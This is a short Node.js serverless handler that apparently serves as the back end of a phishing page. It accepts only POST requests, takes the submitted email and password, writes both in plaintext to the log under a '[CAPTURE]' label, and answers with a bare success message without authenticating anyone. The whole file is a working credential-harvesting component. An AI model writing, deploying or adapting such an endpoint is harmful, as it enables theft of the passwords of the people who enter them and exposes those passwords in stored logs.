module.exports = (req, res) => {
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  const { email, password } = req.body || {};
  console.log(`[CAPTURE] ${new Date().toISOString()} | email=${email} | password=${password}`);

  res.status(200).json({ ok: true });
};
